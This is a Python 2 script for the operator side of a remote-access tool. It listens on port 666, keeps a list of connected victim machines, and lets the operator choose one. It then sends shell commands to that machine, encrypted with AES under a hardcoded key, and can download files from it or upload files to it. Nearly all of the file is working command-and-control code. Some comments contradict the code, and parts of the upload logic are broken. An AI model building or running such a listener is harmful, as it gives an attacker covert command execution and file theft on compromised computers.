#!/usr/bin/python

from Crypto.Cipher import AES
import socket
import base64
import time
import os
import sys,select

# the block size for the cipher object; must be 16 per FIPS-197
BLOCK_SIZE = 32

PADDING = '{'

pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# generate a random secret key
secret = "dz7xf9t6PaC7wN+dPv+QrxHBJ2eGuLAq"

# create a cipher object using the random secret
cipher = AES.new(secret)

# clear function
clear = lambda: os.system('clear')

HOST = '0.0.0.0'
PORT = 666

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind((HOST, PORT))
c.listen(128)
#s,a = c.accept()

active = False
clients = []
socks = []
interval = 0.8

print '\nListening for clients...\n'


# main loop
while True:

    # listen for clients
    try:
            c.settimeout(4)
            try:
                s,a = c.accept()

            except socket.timeout:
                continue
            print "olla omego"
            # add socket
            if (a):
                    # disable timeout
                    s.settimeout(None)
                    # add socket to list
                    socks += [s]
                    # add client to listen
                    clients += [str(a)]

            #display clients
            clear()
            print '\nListening for clients...\n'
            if len(clients) > 0:
                for j in range(0, len(clients)):
                    print '[' + str((j+1)) + '] Client. ' + clients[j] + '\n'
                print "Press Ctrl+C to interact with client"
            time.sleep(interval)

    except KeyboardInterrupt:
            print 'hell no'
            clear()
            print '\nListening for clients...\n'
            if len(clients) > 0:
                for j in range(0, len(clients)):
                    print '[' + str((j+1)) + '] Client: ' + clients[j] + '\n'
                    print "---\n"
                    print "[0] Exit \n"
            activate = input("\nEnter option: ")
            if activate == 0:
                print '\nExiting...\n'
                sys.exit()
            activate -= 1
            clear()
            print '\nActivating client. ' + clients[activate] + '\n'
            active = True
            encrypted = EncodeAES(cipher, 'Activate')
            socks[activate].send(encrypted)

    # interact with client
    while active:
        # receive encrypted data
        data = socks[activate].recv(1024)

        #decrypt data
        decrypted = DecodeAES(cipher, data)

        # check for end of command
        if decrypted.endswith("EOFEOFEOFEOFEOFX") == True:

            # print command
            print decrypted[:-16]

            if decrypted.startswith("Exit") == True:
                active = False
                print 'Press Ctrl+C to return to listener mode...'

            else:

                # get next command.
                nextcmd = raw_input("[shell]: ")

                # encrypt it
                encrypted = EncodeAES(cipher, nextcmd)

                # send that shit
                socks[activate].send(encrypted)

            # download file (normal mode)
            if nextcmd.startswith("download") == True:

                # file name
                downFile = nextcmd[9:]

                # open file
                f = open(downFile, 'wb')
                print 'Downloading: ' + downFile

                #Downloading
                while True:
                    l = socks[activate].recv(1024)
                    while (l):
                            if l.endswith("EOFEOFEOFEOFEOFX"):
                                u = l[:-16]
                                f.write(u)
                                break
                            else:
                                f.write(l)
                                l = socks[activate].recv(1024)
                    break
                f.close()
            if nextcmd.startswith("upload") == True:

                # file name
                upFile = nextcmd[7:]

                # open file.
                g = open(upFile, 'rb')
                print 'Uploading: ' + upFile

                # Uploading
                while l:
                    fileData = g.read()
                    if not fileData: break
                    # begin sending file.
                    socks[activate].sendall(fileData)
                g.close()
                time.sleep(0.8)

                # let client know we're done
                s.sendall('EOFEOFEOFEOFEOFX')
                time.sleep(0.8)

        # else just print
        else:
            print decrypted
